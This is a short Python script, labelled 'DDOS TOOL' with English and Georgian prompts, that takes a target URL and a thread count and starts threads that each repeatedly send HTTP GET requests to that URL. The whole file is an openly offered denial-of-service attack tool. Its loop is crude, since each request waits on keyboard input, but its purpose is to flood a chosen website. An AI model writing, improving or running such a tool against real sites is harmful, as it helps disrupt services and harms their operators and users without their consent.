import colorama
from colorama import Fore, Style
import pystyle
from pystyle import Write, System, Colors, Colorate, Anime
import threading
import requests

# Colors
red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN
blue = Fore.BLUE
orange = Fore.RED + Fore.YELLOW
pretty = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightblue = Fore.LIGHTBLUE_EX
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
reset = Fore.RESET
pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX
dark_green = Fore.GREEN + Style.BRIGHT

def dos(target):
    while True:
        try:
            res = requests.get(target)
            print(f"Request sent! / Request გაიგზავნა! Press Enter to Stop\n")
        except requests.exceptions.ConnectionError:
            print("[!!!] " + "Connection error!")
        command = input("Enter to stop")
        if command.lower() == "":
            break
 
threads = 20

Write.Print(f"""
DDOS TOOL
""", Colors.blue_to_red, interval=0.000)


url = input("Enter URL / მიუთითეთ URL >>> ")
 
try:
    threads = int(input("Threads: "))
except ValueError:
    exit("Threads count is incorrect!")
 
if threads == 0:
    exit("Threads count is incorrect!")
 
if not url.__contains__("http"):
    exit("URL doesnt contains http or https! / URL არ შეიცავს HTTP ან HTTPS!")
 
if not url.__contains__("."):
    exit("Invalid domain! / არასწორი დომეინი!")
 
for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " threads started!")
